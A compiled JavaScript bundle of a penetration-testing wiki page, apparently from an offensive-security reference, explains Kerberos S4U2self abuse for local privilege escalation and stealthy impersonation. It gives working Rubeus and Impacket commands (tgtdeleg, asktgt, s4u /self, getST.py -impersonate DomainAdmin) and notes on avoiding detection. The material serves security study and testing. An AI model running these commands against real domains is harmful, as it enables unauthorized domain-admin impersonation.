import{_ as h,c,a5 as o,G as i,w as t,j as e,a,B as n,o as p}from"./chunks/framework.B5CpDqM0.js";const E=JSON.parse('{"title":"S4U2self abuse","description":"","frontmatter":{"authors":"ShutdownRepo, sckdev"},"headers":[],"relativePath":"ad/movement/kerberos/delegations/s4u2self-abuse.md","filePath":"ad/movement/kerberos/delegations/s4u2self-abuse.md","lastUpdated":1724982529000}'),d={name:"ad/movement/kerberos/delegations/s4u2self-abuse.md"};function k(u,s,g,b,f,m){const l=n("PluginTabsTab"),r=n("PluginTabs");return p(),c("div",null,[s[4]||(s[4]=o('<h1 id="s4u2self-abuse" tabindex="-1">S4U2self abuse <a class="header-anchor" href="#s4u2self-abuse" aria-label="Permalink to &quot;S4U2self abuse&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>The following recipe shows how to abuse S4U2self for Local Privilege Escalation, or for stealthier alternative to Silver Ticket. There are other tricks based on S4U2self, using u2u (user-to-user) as well.</p><h3 id="delegation-and-extensions" tabindex="-1">Delegation and extensions <a class="header-anchor" href="#delegation-and-extensions" aria-label="Permalink to &quot;Delegation and extensions&quot;">​</a></h3><p>Kerberos delegations allow services to access other services on behalf of domain users.</p><p>The &quot;Kerberos&quot; authentication protocol features delegation capabilities. Kerberos delegations can be abused by attackers to obtain access to valuable assets and sometimes even escalate to domain admin privileges. Regarding <a href="./constrained">constrained delegations</a> and <a href="./rbcd">rbcd</a>, those types of delegation rely on Kerberos extensions called <strong>S4U2Self</strong> and <strong>S4U2Proxy</strong>.</p><p>Simply put, Service for User to Self (S4U2self) allows a service to obtain a Service Ticket, on behalf of a user (called &quot;principal&quot;), to itself.</p><p>Last but not least, S4U2self can be used to produce a Service Ticket to oneself on behalf of another domain user, even if that user is &quot;sensitive for delegation&quot; or member of the Protected Users group. Consequently, this allows attackers, in very specific scenarios, to escalate their privileges or perform lateral movements.</p><h3 id="microsoft-virtual-accounts" tabindex="-1">Microsoft Virtual Accounts <a class="header-anchor" href="#microsoft-virtual-accounts" aria-label="Permalink to &quot;Microsoft Virtual Accounts&quot;">​</a></h3><p>Since machine accounts have their own set of SPNs by default at their creation, S4U2self can be used by any machine account, without any supplementary configuration. If an attacker manages to execute code as <code>NT AUTHORITY\\NETWORK SERVICE</code> or as any other &quot;Microsoft Virtual Account&quot; (e.g. <code>defaultapppool</code> or <code>mssqlservice</code>) he will be able to escalate his privileges by abusing S4U2self. This happens because this kind of accounts all act on the network as the machine itself.</p><h3 id="opsec-considerations" tabindex="-1">OPSEC considerations <a class="header-anchor" href="#opsec-considerations" aria-label="Permalink to &quot;OPSEC considerations&quot;">​</a></h3><p>The S4U2self abuse is not only a great way to perform Local Privilege Escalation or a lateral move, it&#39;s also an way more stealthier alternative to <a href="./../forged-tickets/silver">Silver Tickets</a> when an attacker has knowledge of a machine account&#39;s Kerberos keys. While a Silver Ticket is a Service Ticket featuring a forged PAC, the Service Ticket issued after an S4U2self request will be legitimate and will feature a valid PAC.</p><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><p>In order to obtain local admin rights on a target machine, the attackers must be able to execute code on the machine and conduct two major steps: obtain a TGT for the machine account, and use that TGT to make a S4U2self request in order to obtain a Service Ticket as domain admin for the machine.</p><div class="language-powershell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">powershell</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">Rubeus.exe</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> tgtdeleg </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">/</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">nowrap</span></span></code></pre></div><h3 id="_1-machine-account-s-tgt" tabindex="-1">1. Machine account&#39;s TGT <a class="header-anchor" href="#_1-machine-account-s-tgt" aria-label="Permalink to &quot;1. Machine account&#39;s TGT&quot;">​</a></h3><p>This step revolves around the <code>tgtdeleg</code> feature from <a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noreferrer">Rubeus</a> which allows an attacker that has code execution on a machine to ask a TGT, which will be the machine account&#39;s TGT (cf. <a href="./s4u2self-abuse#microsoft-virtual-accounts">Microsoft Virtual Accounts</a>).</p><div class="language-powershell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">powershell</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">Rubeus.exe</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> tgtdeleg </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">/</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">nowrap</span></span></code></pre></div><p>The TGT can then be used with <a href="./../ptt">Pass the Ticket</a> for the next step, which can be conducted remotely if needed, unlike this initial step.</p><p>Alternatively, if the machine account credentials are known, a TGT can be requested commonly.</p>',20)),i(r,null,{default:t(()=>[i(l,{label:"UNIX-like"},{default:t(()=>s[0]||(s[0]=[e("p",null,[a("From UNIX-like systems, "),e("a",{href:"https://github.com/SecureAuthCorp/impacket",target:"_blank",rel:"noreferrer"},"Impacket"),a("'s "),e("a",{href:"https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py",target:"_blank",rel:"noreferrer"},"getTGT.py"),a(" (Python) script can be used for that purpose. Howerver, this step is optional if getST.py is to be used later on for the S4U2self request. In this case, with the appropriate arguments, it will request a TGT automatically")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"getTGT.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_IP"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -hashes"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' :"'),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$NT_HASH"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"/"machine$"')])])])],-1)])),_:1}),i(l,{label:"Windows"},{default:t(()=>s[1]||(s[1]=[e("p",null,[a("From Windows machines, "),e("a",{href:"https://github.com/GhostPack/Rubeus",target:"_blank",rel:"noreferrer"},"Rubeus"),a(" (C#) can be used for that purpose. Howerver, this step is optional if Rubeus is to be used later on for the S4U2sel requestf. In this case, with the appropriate arguments, Rubeus will request a TGT automatically.")],-1),e("div",{class:"language-powershell vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"powershell"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Rubeus.exe"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," asktgt "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"nowrap "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"domain:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"domain"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"user:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"computer$"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"rc4:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"NThash"')])])])],-1)])),_:1})]),_:1}),s[5]||(s[5]=e("h3",{id:"_2-obtain-a-service-ticket",tabindex:"-1"},[a("2. Obtain a Service Ticket "),e("a",{class:"header-anchor",href:"#_2-obtain-a-service-ticket","aria-label":'Permalink to "2. Obtain a Service Ticket"'},"​")],-1)),s[6]||(s[6]=e("p",null,"The TGT can then be used along with S4U2self to obtain a Service Ticket impersonating another domain user on the machine.",-1)),i(r,null,{default:t(()=>[i(l,{label:"UNIX-like"},{default:t(()=>s[2]||(s[2]=[e("p",null,[a("From UNIX-like systems, "),e("a",{href:"https://github.com/SecureAuthCorp/impacket",target:"_blank",rel:"noreferrer"},"Impacket"),a("'s getST.py (Python) script can be used for the purpose. If needed, "),e("code",null,".kirbi"),a(" files can be converted to "),e("code",null,".ccache"),a(" (cf. "),e("a",{href:"./../ptt"},"Pass the Ticket"),a(").")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"export"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," KRB5CCNAME"),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"/path/to/ticket.ccache"')]),a(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"getST.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -self"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -impersonate"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "DomainAdmin"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -altservice"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "cifs/machine.domain.local"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -k"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -no-pass"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "DomainController"'),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},` "domain.local"/'machine$'`)])])])],-1)])),_:1}),i(l,{label:"Windows"},{default:t(()=>s[3]||(s[3]=[e("p",null,[a("From Windows machines, "),e("a",{href:"https://github.com/GhostPack/Rubeus",target:"_blank",rel:"noreferrer"},"Rubeus"),a(" (C#) can be used for that purpose.")],-1),e("div",{class:"language-powershell vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"powershell"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Rubeus.exe"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," s4u "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"self "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"nowrap "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"impersonateuser:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"DomainAdmin"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"altservice:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"cifs/machine.domain.local"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ticket:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"base64ticket"')])])])],-1)])),_:1})]),_:1}),s[7]||(s[7]=o('<p>Once a Service Ticket is received, it can be used with <a href="./../ptt">pass-the-ticket</a>/<a href="./../ptc">pass-the-cache</a> to obtain access to oneself as the &quot;DomainAdmin&quot; (the user can be changed in the request. Attackers should select a domain user which has local admin rights on the machine).</p><div class="tip custom-block"><p>This technique can also be used when receiving TGTs during a <a href="./unconstrained">Kerberos Unconstrained Delegation abuse</a> in order to gain local admin privileges over the victims.</p></div><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://exploit.ph/delegate-2-thyself.html" target="_blank" rel="noreferrer">https://exploit.ph/delegate-2-thyself.html</a></p><p><a href="https://exploit.ph/revisiting-delegate-2-thyself.html" target="_blank" rel="noreferrer">https://exploit.ph/revisiting-delegate-2-thyself.html</a></p><p><a href="https://cyberstoph.org/posts/2021/06/abusing-kerberos-s4u2self-for-local-privilege-escalation" target="_blank" rel="noreferrer">https://cyberstoph.org/posts/2021/06/abusing-kerberos-s4u2self-for-local-privilege-escalation</a></p>',6))])}const F=h(d,[["render",k]]);export{E as __pageData,F as default};
